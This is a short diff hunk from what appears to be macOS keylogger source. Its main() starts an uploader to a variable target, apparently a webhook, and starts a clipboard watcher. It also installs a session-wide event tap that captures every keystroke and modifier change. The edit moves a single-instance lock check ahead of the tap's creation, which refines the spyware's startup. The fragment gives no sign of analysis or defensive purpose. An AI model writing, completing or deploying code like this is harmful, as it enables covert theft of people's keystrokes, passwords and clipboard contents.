@@ -174,11 +174,10 @@ int main(int argc,char**argv){
         }
         if(wh.length) df_startUploader(wh,8);
         df_clipWatch();
-        CFMachPortRef tap=CGEventTapCreate(kCGSessionEventTap,kCGHeadInsertEventTap,kCGEventTapOptionDefault,CGEventMaskBit(kCGEventKeyDown)|CGEventMaskBit(kCGEventFlagsChanged),df_tap,NULL);
-        if(!tap) return 1;
-        // single-instance: bail if another copy holds the lock (prevents dupes)
         int fd=open([[gLogDir stringByAppendingPathComponent:@".lock"] fileSystemRepresentation],O_CREAT|O_RDWR,0600);
         if(fd>=0 && flock(fd,LOCK_EX|LOCK_NB)!=0) return 0;
+        CFMachPortRef tap=CGEventTapCreate(kCGSessionEventTap,kCGHeadInsertEventTap,kCGEventTapOptionDefault,CGEventMaskBit(kCGEventKeyDown)|CGEventMaskBit(kCGEventFlagsChanged),df_tap,NULL);
+        if(!tap) return 1;
         CFRunLoopSourceRef src=CFMachPortCreateRunLoopSource(kCFAllocatorDefault,tap,0);
         CFRunLoopAddSource(CFRunLoopGetCurrent(),src,kCFRunLoopCommonModes);
         CGEventTapEnable(tap,true);
